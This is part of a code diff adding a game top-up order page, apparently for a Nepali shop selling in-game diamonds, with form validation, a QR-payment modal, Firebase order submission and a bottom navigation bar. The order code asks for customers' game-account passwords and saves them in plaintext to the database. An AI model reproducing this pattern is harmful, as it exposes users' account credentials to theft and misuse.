+                accountTypeWrapper.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                isFormValid = false;
+            }
+
+            let phoneEmailValue = gamePhoneEmailInput.value.trim();
+            if (phoneEmailValue === "") {
+                gamePhoneEmailInput.classList.add('error-border');
+                phoneEmailError.style.display = "flex";
+                if(isFormValid) {
+                    gamePhoneEmailInput.focus();
+                    gamePhoneEmailInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+                isFormValid = false;
+            }
+
+            let passwordValue = gamePasswordInput.value.trim();
+            if (passwordValue === "") {
+                gamePasswordInput.classList.add('error-border');
+                passwordError.style.display = "flex";
+                if(isFormValid) {
+                    gamePasswordInput.focus();
+                    gamePasswordInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+                isFormValid = false;
+            }
+
+            let whatsappValue = whatsappInput.value.trim();
+            if (whatsappValue === "") {
+                whatsappInput.classList.add('error-border');
+                whatsappError.style.display = "flex";
+                if(isFormValid) {
+                    whatsappInput.focus();
+                    whatsappInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+                isFormValid = false;
+            }
+
+            if (!selectedItemName) {
+                diamondsWrapper.classList.add('error-border');
+                packError.style.display = "flex";
+                if(isFormValid) diamondsWrapper.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                isFormValid = false;
+            }
+
+            if(!isFormValid) return;
+            openPaymentModal();
+        };
+
+        function openPaymentModal() {
+            document.getElementById('modal-account-type').innerText = selectedAccountType;
+            document.getElementById('modal-item').innerText = selectedItemName;
+            document.getElementById('modal-total').innerText = 'Rs ' + selectedItemPrice;
+            
+            txidInput.value = ""; 
+            txidInput.classList.remove('error-border');
+            txidError.style.display = "none";
+
+            const submitBtn = document.querySelector('.done-btn');
+            if (submitBtn) {
+                submitBtn.disabled = false;
+                submitBtn.innerText = "Submit Payment";
+                submitBtn.style.opacity = "1";
+                submitBtn.style.cursor = "pointer";
+            }
+
+            document.getElementById('qrModal').classList.add('show');
+        }
+
+        window.closePaymentModal = function() {
+            document.getElementById('qrModal').classList.remove('show');
+        };
+
+        window.submitPayment = function() {
+            let txidValue = txidInput.value.trim();
+            let phoneEmailValue = gamePhoneEmailInput.value.trim();
+            let passwordValue = gamePasswordInput.value.trim();
+            let whatsappValue = whatsappInput.value.trim();
+            
+            if (txidValue === "") {
+                txidInput.classList.add('error-border');
+                txidError.style.display = "flex";
+                txidInput.focus();
+                return;
+            }
+
+            const submitBtn = document.querySelector('.done-btn');
+            if (submitBtn) {
+                submitBtn.disabled = true;
+                submitBtn.innerText = "Submitting...";
+                submitBtn.style.opacity = "0.6";
+                submitBtn.style.cursor = "not-allowed";
+            }
+
+            const now = new Date();
+            const orderRef = push(ref(db, 'orders'));
+            
+            set(orderRef, {
+                date: now.toLocaleDateString(),
+                time: now.toLocaleTimeString(),
+                timestamp: Date.now(),
+                email: currentUser.email,
+                name: currentUser.displayName || "User",
+                userId: currentUser.uid,
+                accountType: selectedAccountType,
+                product: selectedItemName,
+                amountDue: selectedItemPrice,
+                phoneOrEmail: phoneEmailValue,
+                password: passwordValue,
+                whatsapp: whatsappValue,
+                transactionId: txidValue,
+                status: "Pending"
+            }).then(() => {
+                closePaymentModal();
+                document.getElementById('receipt-account-type').innerText = selectedAccountType;
+                document.getElementById('receipt-item').innerText = selectedItemName;
+                document.getElementById('receipt-price').innerText = 'Rs ' + selectedItemPrice;
+                document.getElementById('successModal').classList.add('show');
+            }).catch((error) => {
+                alert("अर्डर पठाउन समस्या भयो: " + error.message);
+                
+                if (submitBtn) {
+                    submitBtn.disabled = false;
+                    submitBtn.innerText = "Submit Payment";
+                    submitBtn.style.opacity = "1";
+                    submitBtn.style.cursor = "pointer";
+                }
+            });
+        };
+
+        window.closeSuccessModal = function() {
+            document.getElementById('successModal').classList.remove('show');
+            location.reload();
+        };
+    </script>
+</body>
+</html>
+
+
+<br>
+<br>
+<div class="bottom-nav">
+    <a href="../index.html" class="nav-item">
+        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>
+        <span>Home</span>
+    </a>
+    <a href="../index.html" class="nav-item">
+        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"></path><line x1="3" y1="6" x2="21" y2="6"></line><path d="M16 10a4 4 0 0 1-8 0"></path></svg>
+        <span>Shop</span>
+    </a>
+    <a href="../order" class="nav-item">
+        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
+        <span>Order</span>
+    </a>
+    <a href="../account" class="nav-item">
+        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+        <span>Account</span>
+    </a>
+</div>
+
+<style>
+    .bottom-nav {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        background-color: #ffffff;
+        display: flex;
+        justify-content: space-around;
+        align-items: center;
+        height: 62px;
+        border-top: 1px solid #eaeaea;
+        padding: 0 5px;
+        z-index: 1000;
+        box-sizing: border-box;
+    }
+
+    .bottom-nav .nav-item {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        text-decoration: none;
+        color: #888;
+        font-size: 11px;
+        font-weight: 500;
+        flex: 1;
+        height: 100%;
+        transition: all 0.2s ease-in-out;
+        background: transparent;
+        border: none;
+        box-sizing: border-box;
+    }
+
+    .bottom-nav .nav-item svg {
+        width: 18px;
+        height: 18px;
+        margin-bottom: 3px;
+        stroke: currentColor;
+        fill: none;
+    }
+
+    /* Active huda yellow color hatauna yaha changes garieko xa */
+    .bottom-nav .nav-item.active {
+        color: #333333; /* Active huda kasto color rakhne, yaha dark gray haleko xa */
+    }
+</style>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        const currentPath = window.location.pathname;
+        const navItems = document.querySelectorAll('.bottom-nav .nav-item');
+
+        navItems.forEach(item => {
+            const href = item.getAttribute('href');
+            const cleanHref = href.replace(/\.\./g, '').replace(/\/+/g, '/');
+            
+            if (cleanHref !== "/" && currentPath.includes(cleanHref)) {
+                navItems.forEach(nav => nav.classList.remove('active'));
+                item.classList.add('active');
+            } else if (cleanHref === "/" && (currentPath === "/" || currentPath.endsWith("index.html"))) {
+                navItems.forEach(nav => nav.classList.remove('active'));
+                item.classList.add('active');
+            }
+        });
+    });
+</script>
